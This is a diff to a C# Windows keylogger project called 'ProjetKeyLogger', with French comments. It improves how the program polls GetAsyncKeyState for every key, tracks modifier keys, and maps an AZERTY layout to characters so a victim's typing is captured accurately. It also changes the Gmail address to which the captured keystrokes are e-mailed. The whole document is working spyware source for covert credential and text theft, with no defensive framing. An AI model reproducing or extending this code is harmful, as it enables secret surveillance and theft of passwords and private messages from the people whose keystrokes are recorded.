@@ -4,6 +4,7 @@ using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace ProjetKeyLogger
 {
@@ -29,7 +30,7 @@ namespace ProjetKeyLogger
         {
             //initialisation du nombre de caractere
             nb_caractere_tape = 0;
-
+            
             //Le temps est initialisé (En miliseconde)
             sleep_time = 3;
 
@@ -53,10 +54,12 @@ namespace ProjetKeyLogger
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
             Enregistrement enregistrement = new Enregistrement();
-           
+
+            //Booleen qui détermine si les touches sont activées
             bool majuscule = false;
             bool shift = false;
             bool ctrl = false;
+            bool alt = false;
             bool altgr = false;
 
             //Initialisation du moment de la derniere activité de l'ordinateur de la victime
@@ -64,6 +67,18 @@ namespace ProjetKeyLogger
 
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
+                //On test si la touche shift est enfoncée
+                shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
+                //On test si la Majuscule est activé
+                majuscule = Control.IsKeyLocked(Keys.CapsLock);
+                //On test si la touche ctrl est activée
+                ctrl = (Control.ModifierKeys & Keys.Control) == Keys.Control;
+                //On test si la touche alt cest activée
+                alt = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
+                //On test si la touche altgr est activé
+                // CTRL + ALT
+                altgr = (Control.ModifierKeys & Keys.Alt) == Keys.Alt && (Control.ModifierKeys & Keys.Control) == Keys.Control;
+
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(sleep_time); //nombre en miliseconde
 
@@ -72,6 +87,7 @@ namespace ProjetKeyLogger
                 {
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
+                    //Si la touche alt est activée seule
                     if (statut_cle == 32769)
                     {
                         //le temps d'innactivité est reinitialisé
@@ -81,6 +97,8 @@ namespace ProjetKeyLogger
                         switch (codeASCII)
                         {
                             //Si touche Entrée
+                            case 1:
+                            case 2:
                             case 13:
                                 //On ajoute l'enregistrement a la collection
                                 collection_enregistrement.ajouterNew(enregistrement);
@@ -90,31 +108,39 @@ namespace ProjetKeyLogger
 
                                 break;
 
-                            //touche shift
-                            case 16:
-                                shift = true;
-                                break;
+                            ////touche shift
+                            //case 16:
+                            //   // shift = true;
+                            //    break;
 
-                            //touche majuscule
-                            case 20:
-                                if (majuscule == false)
-                                {
-                                    majuscule = true;
-                                }
-                                else
-                                {
-                                    majuscule = false;
-                                }
-                                break;
+                            ////touche majuscule
+                            //case 20:
+                            //    if (majuscule == false)
+                            //    {
+                            //        majuscule = true;
+                            //    }
+                            //    else
+                            //    {
+                            //        majuscule = false;
+                            //    }
+                            //    break;
 
                             //touche effacer
                             case 8:
-                                enregistrement.effacerContenu();
+                                if (alt == false)
+                                {
+                                    enregistrement.effacerContenu();
+                                }
                                 break;
 
                             //touche espace
-                            case 9:
-                                enregistrement.ajouterContenu(" ");
+                            case 32:
+                                
+                                if (alt == false)
+                                {
+                                    enregistrement.ajouterContenu(" ");
+                                }
+                                
                                 break;
 
                             //touche suppr 
@@ -131,12 +157,10 @@ namespace ProjetKeyLogger
                             case 55:
                             case 56:
                             case 57:
-                                if (ctrl == true)
-                                {
-                                    ctrl = false;
-                                }
-                                else
-                                {
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt) { 
+                                
                                     if (majuscule == false & altgr == false & shift == false)
                                     {
                                         valeurs = "à&é\"'(-è_ç";
@@ -170,11 +194,9 @@ namespace ProjetKeyLogger
                             case 103:
                             case 104:
                             case 105:
-                                if (ctrl == true)
-                                {
-                                    ctrl = false;
-                                }
-                                else
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt)
                                 {
                                     valeurs = "0123456789";
                                     enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 96, 1));
@@ -187,11 +209,9 @@ namespace ProjetKeyLogger
                             case 109:
                             case 110:
                             case 111:
-                                if (ctrl == true)
-                                {
-                                    ctrl = false;
-                                }
-                                else
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt)
                                 {
                                     valeurs = "*+ -./";
                                     enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 106, 1));
@@ -203,25 +223,25 @@ namespace ProjetKeyLogger
                                 break;
 
                             //l'autre shift
-                            case 160:
-                            case 161:
-                                shift = true;
-                                break;
+                            //case 160:
+                            //case 161:
+                            //    shift = true;
+                            //    break;
 
                             //ctrl
-                            case 162:
-                            case 163:
-                                ctrl = true;
-                                break;
+                            //case 162:
+                            //case 163:
+                            //    ctrl = true;
+                            //    break;
 
                             //alt
                             case 164:
                                 break;
 
                             //alt gr
-                            case 165:
-                                altgr = true;
-                                break;
+                            //case 165:
+                            //    altgr = true;
+                            //    break;
 
                             case 186:
                             case 187:
@@ -229,24 +249,20 @@ namespace ProjetKeyLogger
                             case 190:
                             case 191:
                             case 192:
-                                if (ctrl == true)
-                                {
-                                    ctrl = false;
-                                }
-                                else
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt)
                                 {
                                     valeurs = "$=, ;:ù£+? ./%¤}"; 
-                                    if ((majuscule == true | shift == true) & altgr == false)
+                                    if ((majuscule != shift) & altgr == false)
                                     {
                                         enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 179, 1));
-                                        shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & (codeASCII == 186 | codeASCII == 187))
                                         {
                                             enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 172, 1));
-                                            altgr = false;
                                         }
                                         else
                                         {
@@ -261,17 +277,16 @@ namespace ProjetKeyLogger
                             case 221:
                             case 222:
                             case 223:
-                                if (ctrl == true)
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt)
                                 {
-                                    ctrl = false;
-                                }
-                                else
-                                {
+                                
                                     valeurs = ")*^²!°µ¨²§";
-                                    if ((majuscule == true | shift == true) & altgr == false)
+                                    if ((majuscule != shift) & altgr == false)
                                     {
                                         enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 214, 1));
-                                        shift = false;
+                                      
                                     }
                                     else
                                     {
@@ -289,11 +304,9 @@ namespace ProjetKeyLogger
 
                             //touches < et >
                             case 226:
-                                if (ctrl == true)
-                                {
-                                    ctrl = false;
-                                }
-                                else
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt)
                                 {
                                     if (shift == false)
                                     {
@@ -302,7 +315,7 @@ namespace ProjetKeyLogger
                                     else
                                     {
                                         enregistrement.ajouterContenu(">");
-                                        shift = false;
+                                        
                                     }
                                 }
                                 break;
@@ -342,24 +355,28 @@ namespace ProjetKeyLogger
                             case 86:
                             case 66:
                             case 78:
-                                if (ctrl == true)
+                                //Si les touches alt et ctrl on le meme statut
+                                //(true == true) => ALTGR ou (false == false) =>pas activé
+                                if (ctrl == alt)
                                 {
-                                    ctrl = false;
-                                } else
-                                {
-                                    if (majuscule == true | shift == true)
+                                    //Si les deux touches sont activées (true==true) ou aucune des deux (false == false)
+                                    if (majuscule == shift)
                                     {
-                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
-                                        shift = false;
+                                        //on ajoute le contenu en minuscule
+                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
                                     }
                                     else
                                     {
-                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
+                                        //on ajoute le contenu en majuscule
+                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
                                     }
                                 }
                                 break;
+                            default:
+                                break;
                         }
                         nb_caractere_tape += 1;
+
                     }
 
                     //SI le nombre de caracteres tapés a dépassé la limite
@@ -423,7 +440,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            message_mail.To.Add("tulaurapas35@gmail.com");
+            message_mail.To.Add("camenenlythiery@gmail.com");
 
             //defition de l'objet du mail
             message_mail.Subject = objet_mail;
